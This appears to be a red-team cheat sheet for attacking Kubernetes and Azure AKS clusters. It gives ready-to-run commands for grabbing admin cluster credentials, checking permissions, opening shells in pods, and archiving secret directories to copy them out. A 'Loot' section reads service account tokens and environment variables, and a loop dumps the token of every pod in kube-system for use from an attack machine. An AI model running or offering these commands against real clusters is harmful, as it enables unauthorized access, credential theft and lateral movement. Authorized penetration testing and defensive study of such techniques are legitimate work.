# AKS
```Shell
az aks list
az aks get-credentials --admin -g <ResourceGroup> -n <ClusterName> --subscription <SubID>
```

---    
# Kubectl
## Kubectl - Recon
### Auth
```Shell
kubectl auth can-i --list
kubectl --token=<token> --server https://<Server>:<Port#> auth can-i --list
```
> [!NOTE] If running a self-signed cert, add `--insecure-skip-tls-verify` 

### Cluster
```Shell
kubectl api-resources
kubectl get -h #😉
kubectl cluster-info
# Ultimate dump of data on the cluster: kubectl cluster-info dump
kubectl config view -o jsonpath='{.users[*].name}'
kubectl get nodes --all-namespaces -o wide
kubectl get namespaces
kubectl get deployments -A
kubectl get pods --all-namespaces
kubectl get services -o wide --all-namespaces
kubectl get pods -n <> 
# List containers running in pod (usually 1, but there can be more in there 😉:
kubectl get pods <Pod> -n <Namespace> -o jsonpath='{.spec.containers[*].name}'
# Get juicy data out of the pod:
kubectl describe pod <Pod> -n <Namespace>
# Search for Containers only
kubectl describe pod <Pod> -n <Namespace> | grep "Containers" -A 15
```

## Kubectl - Execution
```Shell
kubectl exec <Pod> -it -- /bin/bash
# Sometimes bash is not available
kubectl exec <Pod> -it -- /bin/sh
# Exec in pod in a given namespace
kubectl exec <Pod> -n <Namespace> -it -- /bin/bash
# Exec in a pod, in a given namespace with multiple containers
kubectl exec <Pod> -n <Namespace> -c <ContainerName> -it -- /bin/bash
```

## Kubectl - Copy files over
### Copy files to a pod
```Shell
kubectl cp /local/file <Namespace>/<Pod>:/tmp/file
# To a specific  container
kubectl cp /local/file <Namespace>/<Pod>:/tmp/file -c <ContainerName>
```
### Copy files from a pod down to your machine
```Shell
# tar the directory with this command in the target container:
tar tar cvfz /tmp/directory.tar.gz -C / secrets/allTheSecrets/

kubectl cp <Namespace>/<Pod>:tmp/directory.tar.gz /tmp/directory.tar.gz
tar xvzf /tmp/directory.tar.gz
```

---    
# Loot
## Loot via Shell @ Container
```Shell
env
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```
### Leveraging the token on local attack machine
```Shell
export TOKEN=<token>
# Then use the --token=$TOKEN with kubectl
```
## Loot by running commands on containers using kubectl remotely:
```Shell
# Getting the environment variables of each container


# Getting the token of each container
for pod in $(kubectl get po --output=jsonpath={.items..metadata.name} -n kube-system); do echo $pod && kubectl exec -it $pod -n kube-system -- cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo; echo; echo "========================================================"; done
```


---     
# Talking to other APIs + Services from Pod/Container
```Shell
wget -O- https://10.0.1.2:443 --no-check-certificate
```

---    
